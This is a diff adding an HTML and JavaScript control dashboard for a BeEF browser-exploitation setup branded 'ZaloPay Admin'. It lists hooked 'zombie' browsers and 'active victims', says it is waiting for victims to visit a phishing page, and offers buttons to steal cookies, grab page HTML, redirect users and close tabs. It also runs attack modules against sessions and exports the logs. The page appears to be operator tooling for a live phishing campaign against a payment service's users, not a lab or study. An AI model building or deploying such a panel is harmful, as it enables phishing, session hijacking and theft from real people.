@@ -1,0 +1,849 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BeEF Control Panel - ZaloPay Admin</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        .status-online { background-color: #28a745; }
+        .status-offline { background-color: #dc3545; }
+        .status-idle { background-color: #ffc107; }
+        
+        .session-card {
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        .session-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        
+        .command-history {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .real-time-indicator {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .stats-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        
+        .victim-card {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+        }
+    </style>
+</head>
+<body class="bg-light">
+<div class="container-fluid">
+        <!-- Header -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="d-flex justify-content-between align-items-center">
+                    <h1 class="h3 mb-0 text-gray-800">
+                        <i class="fas fa-bug text-danger"></i> BeEF Control Panel
+                        <span class="badge bg-success real-time-indicator">LIVE</span>
+                    </h1>
+                    <div class="btn-group">
+                        <button class="btn btn-outline-primary" onclick="refreshData()">
+                            <i class="fas fa-sync-alt"></i> Refresh
+                        </button>
+                        <button class="btn btn-outline-danger" onclick="exportLogs()">
+                            <i class="fas fa-download"></i> Export Logs
+                        </button>
+                        <button class="btn btn-outline-info" onclick="toggleAutoRefresh()">
+                            <i class="fas fa-play" id="autoRefreshIcon"></i> 
+                            <span id="autoRefreshText">Auto Refresh</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Statistics Cards -->
+        <div class="row mb-4">
+            <div class="col-md-3">
+                <div class="card stats-card">
+                    <div class="card-body">
+                        <div class="d-flex justify-content-between">
+                            <div>
+                                <h6 class="card-title">Total Sessions</h6>
+                                <h3 id="totalSessions">0</h3>
+                            </div>
+                            <div class="align-self-center">
+                                <i class="fas fa-users fa-2x"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card victim-card">
+                    <div class="card-body">
+                        <div class="d-flex justify-content-between">
+                            <div>
+                                <h6 class="card-title">Active Victims</h6>
+                                <h3 id="activeVictims">0</h3>
+                            </div>
+                            <div class="align-self-center">
+                                <i class="fas fa-crosshairs fa-2x"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card bg-success text-white">
+                    <div class="card-body">
+                        <div class="d-flex justify-content-between">
+                            <div>
+                                <h6 class="card-title">Commands Executed</h6>
+                                <h3 id="totalCommands">0</h3>
+                            </div>
+                            <div class="align-self-center">
+                                <i class="fas fa-terminal fa-2x"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card bg-warning text-white">
+                    <div class="card-body">
+                        <div class="d-flex justify-content-between">
+                            <div>
+                                <h6 class="card-title">Success Rate</h6>
+                                <h3 id="successRate">0%</h3>
+                            </div>
+                            <div class="align-self-center">
+                                <i class="fas fa-chart-line fa-2x"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="row">
+            <!-- Hooked Browsers -->
+            <div class="col-lg-8">
+                <div class="card shadow">
+                    <div class="card-header py-3 d-flex justify-content-between align-items-center">
+                        <h6 class="m-0 font-weight-bold text-primary">
+                            <i class="fas fa-desktop"></i> Hooked Browsers (Zombies)
+                        </h6>
+                        <span class="badge bg-primary" id="zombieCount">0</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="row" id="zombiesContainer">
+                            <!-- Zombie cards will be loaded here -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Command History & Quick Actions -->
+            <div class="col-lg-4">
+    <div class="card shadow mb-4">
+        <div class="card-header py-3">
+                        <h6 class="m-0 font-weight-bold text-success">
+                            <i class="fas fa-history"></i> Recent Commands
+                        </h6>
+                    </div>
+                    <div class="card-body">
+                        <div class="command-history" id="commandHistory">
+                            <!-- Command history will be loaded here -->
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card shadow">
+                    <div class="card-header py-3">
+                        <h6 class="m-0 font-weight-bold text-info">
+                            <i class="fas fa-bolt"></i> Quick Actions
+                        </h6>
+        </div>
+        <div class="card-body">
+                        <div class="d-grid gap-2">
+                            <button class="btn btn-outline-primary" onclick="executeQuickCommand('get_cookie')">
+                                <i class="fas fa-cookie-bite"></i> Get Cookies
+                            </button>
+                            <button class="btn btn-outline-success" onclick="executeQuickCommand('get_page_html')">
+                                <i class="fas fa-code"></i> Get Page HTML
+                            </button>
+                            <button class="btn btn-outline-warning" onclick="executeQuickCommand('redirect')">
+                                <i class="fas fa-external-link-alt"></i> Redirect
+                            </button>
+                            <button class="btn btn-outline-danger" onclick="executeQuickCommand('close_tab')">
+                                <i class="fas fa-times"></i> Close Tab
+                            </button>
+                        </div>
+                    </div>
+                </div>
+        </div>
+    </div>
+</div>
+
+<!-- Module Execution Modal -->
+<div class="modal fade" id="moduleExecutionModal" tabindex="-1" role="dialog" aria-labelledby="moduleExecutionModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                    <h5 class="modal-title" id="moduleExecutionModalLabel">
+                        <i class="fas fa-terminal"></i> Execute BeEF Module
+                    </h5>
+                    <button class="close" type="button" data-bs-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+            <div class="modal-body">
+                <form id="moduleExecutionForm">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="form-group mb-3">
+                                    <label for="sessionId" class="form-label">Session ID:</label>
+                        <input type="text" class="form-control" id="sessionId" readonly>
+                    </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="form-group mb-3">
+                                    <label for="victimInfo" class="form-label">Victim Info:</label>
+                                    <input type="text" class="form-control" id="victimInfo" readonly>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="form-group mb-3">
+                                    <label for="moduleCategory" class="form-label">Module Category:</label>
+                                    <select class="form-select" id="moduleCategory" onchange="filterModulesByCategory()">
+                            <option value="">Select Category</option>
+                        </select>
+                    </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="form-group mb-3">
+                                    <label for="moduleName" class="form-label">Module Name:</label>
+                                    <select class="form-select" id="moduleName" onchange="loadModuleParameters()">
+                            <option value="">Select Module</option>
+                        </select>
+                    </div>
+                            </div>
+                        </div>
+                        
+                    <div id="moduleParameters" class="mt-3">
+                        <!-- Dynamic parameter fields will be loaded here -->
+                    </div>
+                </form>
+                    
+                    <div id="moduleResult" class="mt-3">
+                        <!-- Module execution results will be displayed here -->
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" type="button" data-bs-dismiss="modal">Cancel</button>
+                    <button class="btn btn-primary" onclick="submitModule()">
+                        <i class="fas fa-play"></i> Execute
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Session Details Modal -->
+    <div class="modal fade" id="sessionDetailsModal" tabindex="-1" role="dialog" aria-labelledby="sessionDetailsModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-xl" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="sessionDetailsModalLabel">
+                        <i class="fas fa-info-circle"></i> Session Details
+                    </h5>
+                    <button class="close" type="button" data-bs-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h6>Browser Information</h6>
+                            <div id="browserInfo"></div>
+                        </div>
+                        <div class="col-md-6">
+                            <h6>System Information</h6>
+                            <div id="systemInfo"></div>
+                        </div>
+                    </div>
+                    <hr>
+                    <div class="row">
+                        <div class="col-12">
+                            <h6>Command History</h6>
+                            <div id="sessionCommandHistory" class="command-history"></div>
+                        </div>
+                    </div>
+            </div>
+            <div class="modal-footer">
+                    <button class="btn btn-secondary" type="button" data-bs-dismiss="modal">Close</button>
+                    <button class="btn btn-danger" onclick="terminateSession()">
+                        <i class="fas fa-times"></i> Terminate Session
+                    </button>
+                </div>
+        </div>
+    </div>
+</div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    let currentSessionId = null;
+    let allModules = {};
+        let autoRefreshEnabled = true;
+        let refreshInterval = null;
+        let currentSessionData = null;
+
+        // Initialize dashboard
+        document.addEventListener('DOMContentLoaded', () => {
+            fetchZombies();
+            fetchModules();
+            fetchStatistics();
+            fetchCommandHistory();
+            
+            if (autoRefreshEnabled) {
+                startAutoRefresh();
+            }
+        });
+
+        // Auto-refresh functionality
+        function startAutoRefresh() {
+            refreshInterval = setInterval(() => {
+                if (autoRefreshEnabled) {
+                    fetchZombies();
+                    fetchStatistics();
+                    fetchCommandHistory();
+                }
+            }, 5000);
+        }
+
+        function stopAutoRefresh() {
+            if (refreshInterval) {
+                clearInterval(refreshInterval);
+                refreshInterval = null;
+            }
+        }
+
+        function toggleAutoRefresh() {
+            autoRefreshEnabled = !autoRefreshEnabled;
+            const icon = document.getElementById('autoRefreshIcon');
+            const text = document.getElementById('autoRefreshText');
+            
+            if (autoRefreshEnabled) {
+                icon.className = 'fas fa-pause';
+                text.textContent = 'Pause Auto Refresh';
+                startAutoRefresh();
+            } else {
+                icon.className = 'fas fa-play';
+                text.textContent = 'Auto Refresh';
+                stopAutoRefresh();
+            }
+        }
+
+        // Fetch and display hooked browsers
+    async function fetchZombies() {
+        try {
+                const response = await fetch('/api/beef/sessions');
+            const data = await response.json();
+                const container = document.getElementById('zombiesContainer');
+                const countBadge = document.getElementById('zombieCount');
+                
+                container.innerHTML = '';
+                
+                if (data && data.success && data.sessions) {
+                    countBadge.textContent = data.sessions.length;
+                    
+                    if (data.sessions.length === 0) {
+                        container.innerHTML = `
+                            <div class="col-12 text-center py-5">
+                                <i class="fas fa-desktop fa-3x text-muted mb-3"></i>
+                                <h5 class="text-muted">No hooked browsers</h5>
+                                <p class="text-muted">Waiting for victims to visit the phishing page...</p>
+                            </div>
+                        `;
+                    } else {
+                        data.sessions.forEach(session => {
+                            const card = createZombieCard(session);
+                            container.appendChild(card);
+                        });
+                    }
+                } else {
+                    container.innerHTML = `
+                        <div class="col-12 text-center py-5">
+                            <i class="fas fa-exclamation-triangle fa-3x text-danger mb-3"></i>
+                            <h5 class="text-danger">Error loading sessions</h5>
+                            <p class="text-muted">${data.error || 'Unknown error'}</p>
+                        </div>
+                    `;
+            }
+        } catch (error) {
+            console.error('Error fetching zombies:', error);
+                document.getElementById('zombiesContainer').innerHTML = `
+                    <div class="col-12 text-center py-5">
+                        <i class="fas fa-exclamation-triangle fa-3x text-danger mb-3"></i>
+                        <h5 class="text-danger">Connection Error</h5>
+                        <p class="text-muted">${error.message}</p>
+                    </div>
+                `;
+            }
+        }
+
+        // Create zombie card
+        function createZombieCard(session) {
+            const card = document.createElement('div');
+            card.className = 'col-md-6 mb-3';
+            
+            const statusClass = session.is_active ? 'status-online' : 'status-offline';
+            const lastSeen = new Date(session.last_seen).toLocaleString();
+            
+            card.innerHTML = `
+                <div class="card session-card" onclick="showSessionDetails('${session.session_id}')">
+                    <div class="card-body">
+                        <div class="d-flex justify-content-between align-items-start mb-2">
+                            <h6 class="card-title mb-0">
+                                <span class="status-indicator ${statusClass}"></span>
+                                Session ${session.session_id.substring(0, 8)}...
+                            </h6>
+                            <span class="badge bg-${session.is_active ? 'success' : 'secondary'}">
+                                ${session.is_active ? 'Active' : 'Inactive'}
+                            </span>
+                        </div>
+                        
+                        <div class="row text-muted small">
+                            <div class="col-6">
+                                <i class="fas fa-globe"></i> ${session.ip_address || 'Unknown'}
+                            </div>
+                            <div class="col-6">
+                                <i class="fas fa-clock"></i> ${lastSeen}
+                            </div>
+                        </div>
+                        
+                        <div class="row text-muted small mt-2">
+                            <div class="col-6">
+                                <i class="fas fa-terminal"></i> ${session.command_count || 0} commands
+                            </div>
+                            <div class="col-6">
+                                <i class="fas fa-check-circle"></i> ${session.successful_commands || 0} success
+                            </div>
+                        </div>
+                        
+                        <div class="mt-3">
+                            <button class="btn btn-sm btn-outline-primary me-2" onclick="event.stopPropagation(); openModuleExecutionModal('${session.session_id}')">
+                                <i class="fas fa-play"></i> Execute
+                            </button>
+                            <button class="btn btn-sm btn-outline-info" onclick="event.stopPropagation(); showSessionDetails('${session.session_id}')">
+                                <i class="fas fa-info-circle"></i> Details
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            return card;
+        }
+
+        // Fetch statistics
+        async function fetchStatistics() {
+            try {
+                const response = await fetch('/api/beef/statistics');
+                const data = await response.json();
+                
+                if (data && data.success) {
+                    document.getElementById('totalSessions').textContent = data.total_sessions || 0;
+                    document.getElementById('activeVictims').textContent = data.active_sessions || 0;
+                    document.getElementById('totalCommands').textContent = data.total_commands || 0;
+                    document.getElementById('successRate').textContent = `${Math.round(data.success_rate || 0)}%`;
+                }
+            } catch (error) {
+                console.error('Error fetching statistics:', error);
+            }
+        }
+
+        // Fetch command history
+        async function fetchCommandHistory() {
+            try {
+                const response = await fetch('/api/beef/command-history');
+                const data = await response.json();
+                const container = document.getElementById('commandHistory');
+                
+                container.innerHTML = '';
+                
+                if (data && data.success && data.commands) {
+                    if (data.commands.length === 0) {
+                        container.innerHTML = '<p class="text-muted text-center">No commands executed yet</p>';
+                    } else {
+                        data.commands.slice(0, 10).forEach(cmd => {
+                            const cmdDiv = document.createElement('div');
+                            cmdDiv.className = 'border-bottom pb-2 mb-2';
+                            cmdDiv.innerHTML = `
+                                <div class="d-flex justify-content-between">
+                                    <small class="text-muted">${cmd.command}</small>
+                                    <small class="text-muted">${new Date(cmd.executed_at).toLocaleTimeString()}</small>
+                                </div>
+                                <div class="small text-${cmd.success ? 'success' : 'danger'}">
+                                    ${cmd.success ? 'Success' : 'Failed'}
+                                </div>
+                            `;
+                            container.appendChild(cmdDiv);
+                        });
+                    }
+                }
+            } catch (error) {
+                console.error('Error fetching command history:', error);
+            }
+        }
+
+        // Show session details
+        async function showSessionDetails(sessionId) {
+            try {
+                const response = await fetch(`/api/beef/sessions/${sessionId}`);
+                const data = await response.json();
+                
+                if (data && data.success) {
+                    currentSessionData = data.session_data;
+                    
+                    // Update modal content
+                    document.getElementById('browserInfo').innerHTML = `
+                        <p><strong>User Agent:</strong> ${data.session_data.user_agent || 'Unknown'}</p>
+                        <p><strong>Browser:</strong> ${data.session_data.browser_info.browser || 'Unknown'}</p>
+                        <p><strong>Version:</strong> ${data.session_data.browser_info.version || 'Unknown'}</p>
+                    `;
+                    
+                    document.getElementById('systemInfo').innerHTML = `
+                        <p><strong>OS:</strong> ${data.session_data.browser_info.os || 'Unknown'}</p>
+                        <p><strong>Platform:</strong> ${data.session_data.browser_info.platform || 'Unknown'}</p>
+                        <p><strong>Language:</strong> ${data.session_data.browser_info.language || 'Unknown'}</p>
+                    `;
+                    
+                    // Show command history
+                    const cmdHistory = document.getElementById('sessionCommandHistory');
+                    cmdHistory.innerHTML = '';
+                    
+                    if (data.session_data.exploited_commands && data.session_data.exploited_commands.length > 0) {
+                        data.session_data.exploited_commands.forEach(cmd => {
+                            const cmdDiv = document.createElement('div');
+                            cmdDiv.className = 'border-bottom pb-2 mb-2';
+                            cmdDiv.innerHTML = `
+                                <div class="d-flex justify-content-between">
+                                    <small class="text-muted">${cmd.command}</small>
+                                    <small class="text-muted">${new Date(cmd.executed_at).toLocaleString()}</small>
+                                </div>
+                                <div class="small text-${cmd.success ? 'success' : 'danger'}">
+                                    ${cmd.success ? 'Success' : 'Failed'}
+                                </div>
+                                ${cmd.result ? `<pre class="small mt-1">${JSON.stringify(cmd.result, null, 2)}</pre>` : ''}
+                            `;
+                            cmdHistory.appendChild(cmdDiv);
+                        });
+                    } else {
+                        cmdHistory.innerHTML = '<p class="text-muted text-center">No commands executed</p>';
+                    }
+                    
+                    // Show modal
+                    const modal = new bootstrap.Modal(document.getElementById('sessionDetailsModal'));
+                    modal.show();
+                }
+            } catch (error) {
+                console.error('Error fetching session details:', error);
+                alert('Error loading session details: ' + error.message);
+            }
+        }
+
+        // Open module execution modal
+        function openModuleExecutionModal(sessionId) {
+            currentSessionId = sessionId;
+            document.getElementById('sessionId').value = sessionId;
+            
+            // Find session data for victim info
+            const sessionData = currentSessionData || {};
+            document.getElementById('victimInfo').value = 
+                `${sessionData.ip_address || 'Unknown'} - ${sessionData.user_agent ? sessionData.user_agent.substring(0, 50) + '...' : 'Unknown'}`;
+            
+            const modal = new bootstrap.Modal(document.getElementById('moduleExecutionModal'));
+            modal.show();
+        }
+
+        // Fetch available modules
+    async function fetchModules() {
+        try {
+            const response = await fetch('/api/beef/modules');
+            const data = await response.json();
+            const moduleCategorySelect = document.getElementById('moduleCategory');
+            moduleCategorySelect.innerHTML = '<option value="">Select Category</option>';
+
+                if (data && data.success && data.modules) {
+                    allModules = data.modules;
+                for (const category in data.modules) {
+                    const option = document.createElement('option');
+                    option.value = category;
+                    option.textContent = category;
+                    moduleCategorySelect.appendChild(option);
+                }
+            } else if (data.error) {
+                moduleCategorySelect.innerHTML = `<option value="">Error: ${data.error}</option>`;
+            }
+        } catch (error) {
+            console.error('Error fetching modules:', error);
+            document.getElementById('moduleCategory').innerHTML = `<option value="">Error loading categories: ${error.message}</option>`;
+        }
+    }
+
+        // Filter modules by category
+    function filterModulesByCategory() {
+        const selectedCategory = document.getElementById('moduleCategory').value;
+        const moduleNameSelect = document.getElementById('moduleName');
+        moduleNameSelect.innerHTML = '<option value="">Select Module</option>';
+            document.getElementById('moduleParameters').innerHTML = '';
+
+        if (selectedCategory && allModules[selectedCategory]) {
+            allModules[selectedCategory].forEach(module => {
+                const option = document.createElement('option');
+                option.value = module.name;
+                option.textContent = module.name;
+                moduleNameSelect.appendChild(option);
+            });
+        }
+    }
+
+        // Load module parameters
+    async function loadModuleParameters() {
+        const selectedModule = document.getElementById('moduleName').value;
+        const moduleParametersDiv = document.getElementById('moduleParameters');
+            moduleParametersDiv.innerHTML = '';
+
+        if (!selectedModule) return;
+
+        try {
+            let moduleId = null;
+            for (const category in allModules) {
+                const module = allModules[category].find(m => m.name === selectedModule);
+                if (module) {
+                    moduleId = module.id;
+                    break;
+                }
+            }
+
+            if (!moduleId) {
+                moduleParametersDiv.innerHTML = '<p class="text-danger">Module ID not found.</p>';
+                return;
+            }
+
+            const response = await fetch(`/api/beef/modules/${moduleId}`);
+            const data = await response.json();
+
+                if (data && data.success && data.parameters) {
+                data.parameters.forEach(param => {
+                    const paramDiv = document.createElement('div');
+                        paramDiv.className = 'form-group mb-3';
+                    let inputField = '';
+
+                    switch (param.type) {
+                        case 'text':
+                        case 'string':
+                            inputField = `<input type="text" class="form-control" id="param_${param.name}" name="${param.name}" value="${param.value || ''}" placeholder="${param.description || ''}">`;
+                            break;
+                        case 'textarea':
+                            inputField = `<textarea class="form-control" id="param_${param.name}" name="${param.name}" rows="3" placeholder="${param.description || ''}">${param.value || ''}</textarea>`;
+                            break;
+                        case 'boolean':
+                            inputField = `
+                                <div class="form-check">
+                                    <input type="checkbox" class="form-check-input" id="param_${param.name}" name="${param.name}" ${param.value ? 'checked' : ''}>
+                                    <label class="form-check-label" for="param_${param.name}">${param.description || param.name}</label>
+                                </div>
+                            `;
+                            break;
+                        default:
+                            inputField = `<input type="text" class="form-control" id="param_${param.name}" name="${param.name}" value="${param.value || ''}" placeholder="${param.description || ''}">`;
+                    }
+
+                    paramDiv.innerHTML = `
+                            <label for="param_${param.name}" class="form-label">${param.displayName || param.name}:</label>
+                        ${inputField}
+                    `;
+                    moduleParametersDiv.appendChild(paramDiv);
+                });
+            } else if (data.error) {
+                moduleParametersDiv.innerHTML = `<p class="text-danger">Error loading module parameters: ${data.error}</p>`;
+            } else {
+                moduleParametersDiv.innerHTML = '<p class="text-info">No parameters for this module.</p>';
+            }
+        } catch (error) {
+            console.error('Error loading module parameters:', error);
+            moduleParametersDiv.innerHTML = `<p class="text-danger">Error loading module parameters: ${error.message}</p>`;
+        }
+    }
+
+        // Submit module execution
+    async function submitModule() {
+        const sessionId = document.getElementById('sessionId').value;
+        const moduleName = document.getElementById('moduleName').value;
+        const moduleResultDiv = document.getElementById('moduleResult');
+        const moduleParametersDiv = document.getElementById('moduleParameters');
+
+            moduleResultDiv.innerHTML = '<div class="text-center"><div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading...</span></div></div>';
+
+        const parameters = {};
+        moduleParametersDiv.querySelectorAll('input, textarea').forEach(input => {
+            if (input.type === 'checkbox') {
+                parameters[input.name] = input.checked;
+            } else {
+                parameters[input.name] = input.value;
+            }
+        });
+
+        try {
+                const response = await fetch('/api/beef/execute', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    module_name: moduleName,
+                    parameters: parameters
+                })
+            });
+
+            const result = await response.json();
+            if (result.error) {
+                    moduleResultDiv.innerHTML = `<div class="alert alert-danger">Error: ${result.error}</div>`;
+            } else {
+                    moduleResultDiv.innerHTML = `
+                        <div class="alert alert-success">
+                            <h6>Command Executed Successfully</h6>
+                            <pre class="mt-2">${JSON.stringify(result, null, 2)}</pre>
+                        </div>
+                    `;
+                    
+                    // Refresh data after successful execution
+                    setTimeout(() => {
+                        fetchZombies();
+                        fetchStatistics();
+                        fetchCommandHistory();
+                    }, 1000);
+            }
+        } catch (error) {
+                moduleResultDiv.innerHTML = `<div class="alert alert-danger">Error: ${error.message}</div>`;
+            console.error('Error executing module:', error);
+        }
+    }
+
+        // Quick command execution
+        async function executeQuickCommand(command) {
+            if (!currentSessionId) {
+                alert('Please select a session first');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/beef/execute', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        session_id: currentSessionId,
+                        module_name: command,
+                        parameters: {}
+                    })
+                });
+
+                const result = await response.json();
+                if (result.error) {
+                    alert('Error: ' + result.error);
+                } else {
+                    alert('Command executed successfully!');
+                    fetchZombies();
+                    fetchStatistics();
+                    fetchCommandHistory();
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+                console.error('Error executing quick command:', error);
+            }
+        }
+
+        // Export logs
+        async function exportLogs() {
+            try {
+                const response = await fetch('/api/beef/export-logs');
+                const blob = await response.blob();
+                
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `beef-logs-${new Date().toISOString().split('T')[0]}.json`;
+                document.body.appendChild(a);
+                a.click();
+                window.URL.revokeObjectURL(url);
+                document.body.removeChild(a);
+            } catch (error) {
+                alert('Error exporting logs: ' + error.message);
+                console.error('Error exporting logs:', error);
+            }
+        }
+
+        // Terminate session
+        async function terminateSession() {
+            if (!currentSessionData) return;
+            
+            if (confirm('Are you sure you want to terminate this session?')) {
+                try {
+                    const response = await fetch(`/api/beef/sessions/${currentSessionData.session_id}/terminate`, {
+                        method: 'DELETE'
+                    });
+                    
+                    const result = await response.json();
+                    if (result.success) {
+                        alert('Session terminated successfully');
+                        bootstrap.Modal.getInstance(document.getElementById('sessionDetailsModal')).hide();
+                        fetchZombies();
+                        fetchStatistics();
+                    } else {
+                        alert('Error terminating session: ' + result.error);
+                    }
+                } catch (error) {
+                    alert('Error terminating session: ' + error.message);
+                    console.error('Error terminating session:', error);
+                }
+            }
+        }
+
+        // Refresh all data
+        function refreshData() {
+        fetchZombies();
+        fetchModules();
+            fetchStatistics();
+            fetchCommandHistory();
+        }
+</script>
+</body>
+</html>
